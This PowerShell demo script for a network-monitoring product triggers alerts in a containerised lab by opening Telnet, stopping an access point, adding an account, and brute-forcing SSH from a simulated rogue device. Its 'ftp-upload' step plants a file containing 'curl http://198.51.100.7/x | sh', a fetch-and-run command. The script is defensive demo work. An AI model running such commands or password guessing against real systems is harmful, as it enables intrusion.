# CampusShield demo helper: make changes on the lab network, then scan to see the alerts.
#   .\scripts\demo.ps1 open-port     switch Telnet on at the lab PC (.20)  -> "port opened", "risk rose"
#   .\scripts\demo.ps1 close-port    switch it off again                   -> the alert resolves itself
#   .\scripts\demo.ps1 unplug        power off the Wi-Fi AP (.30)          -> "did not respond"
#   .\scripts\demo.ps1 plug          power it on again                     -> the alert resolves itself
#   .\scripts\demo.ps1 scan          start a standard scan the way n8n does (-Profile quick|standard|deep)
#   With the Wazuh manager running (stack.ps1 up -Siem), events on the lab PC:
#   .\scripts\demo.ps1 brute-force   the rogue Pi (.66) guesses SSH passwords on the lab PC -> "brute force attempt"
#   .\scripts\demo.ps1 add-user      a new account on the lab PC                    -> "User accounts changed"
#   .\scripts\demo.ps1 ftp-upload    a file dropped on the anonymous FTP share       -> "File uploaded ..."
#   .\scripts\demo.ps1 reset         undo every change above
param(
    [Parameter(Mandatory)][ValidateSet("open-port", "close-port", "unplug", "plug", "scan", "brute-force", "add-user", "ftp-upload", "reset")]
    [string]$Action,
    [ValidateSet("quick", "standard", "deep")][string]$Profile = "standard"
)

$ErrorActionPreference = "Continue"  # docker writes progress to stderr
$root = Split-Path $PSScriptRoot -Parent
# Docker Desktop: the default install location, or a custom one (e.g. D:\Docker\Program)
$dockerHome = @("$env:ProgramFiles\Docker\Docker", "D:\Docker\Program") |
    Where-Object { Test-Path (Join-Path $_ "Docker Desktop.exe") } | Select-Object -First 1
if ($dockerHome) { $env:Path = "$dockerHome\resources\bin;$env:Path" }

function Get-EnvValue([string]$name) {
    $line = Get-Content (Join-Path $root ".env") | Where-Object { $_ -match "^$name=" } | Select-Object -First 1
    if (-not $line) { throw "$name is not set in .env" }
    return $line.Substring($name.Length + 1)
}

function Stop-Telnet {
    docker compose exec -T lab-pc-01 sh -c "pkill telnetd; true" | Out-Null
}

Push-Location $root
try {
    switch ($Action) {
        "open-port" {
            docker compose exec -T lab-pc-01 sh -c "pgrep telnetd >/dev/null || telnetd -p 23 -l /bin/login"
            Write-Host "Telnet (23/tcp) is now open on lab-pc-01 (172.25.0.20). Run a scan to see the alert."
        }
        "close-port" {
            Stop-Telnet
            Write-Host "Telnet closed on lab-pc-01. The next scan resolves the 'port opened' alert."
        }
        "unplug" {
            docker compose stop wifi-ap | Out-Null
            Write-Host "Wi-Fi AP (172.25.0.30) is off. Run a scan to see the 'did not respond' alert."
        }
        "plug" {
            docker compose start wifi-ap | Out-Null
            Write-Host "Wi-Fi AP is back. The next scan resolves the alert."
        }
        "scan" {
            $headers = @{ "X-API-Key" = (Get-EnvValue "SERVICE_API_KEY") }
            $body = @{ profile = $Profile } | ConvertTo-Json
            $scan = Invoke-RestMethod -Method Post -Uri "http://127.0.0.1:8000/api/v1/automation/scans" `
                -Headers $headers -Body $body -ContentType "application/json"
            Write-Host "Scan #$($scan.id) ($Profile) started. Watch it on http://localhost:3000/scans"
        }
        "brute-force" {
            # dbclient tries the password up to 10 times per connection; Wazuh rule 51007
            # fires after 8 failures within 2 minutes
            docker compose exec -T mystery-device sh -c "DROPBEAR_PASSWORD=Winter2026 timeout 15 dbclient -y -y -T root@172.25.0.20 true >/dev/null 2>&1; true"
            Write-Host "10 wrong SSH passwords from 172.25.0.66 to lab-pc-01. The alert appears within seconds."
        }
        "add-user" {
            docker compose exec -T lab-pc-01 sh -c "id support2 >/dev/null 2>&1 || adduser -D -s /bin/sh support2"
            Write-Host "Account 'support2' created on lab-pc-01 (file integrity: /etc/passwd, /etc/shadow)."
        }
        "ftp-upload" {
            docker compose exec -T lab-pc-01 sh -c "echo 'curl http://198.51.100.7/x | sh' > /var/ftp/pub/update.sh"
            Write-Host "update.sh dropped on the anonymous FTP share of lab-pc-01."
        }
        "reset" {
            Stop-Telnet
            docker compose start wifi-ap | Out-Null
            docker compose exec -T lab-pc-01 sh -c "deluser support2 2>/dev/null; rm -f /var/ftp/pub/update.sh; true" | Out-Null
            Write-Host "Lab back to its normal state (Telnet off, Wi-Fi AP on, no demo account or upload)."
        }
    }
} finally {
    Pop-Location
}
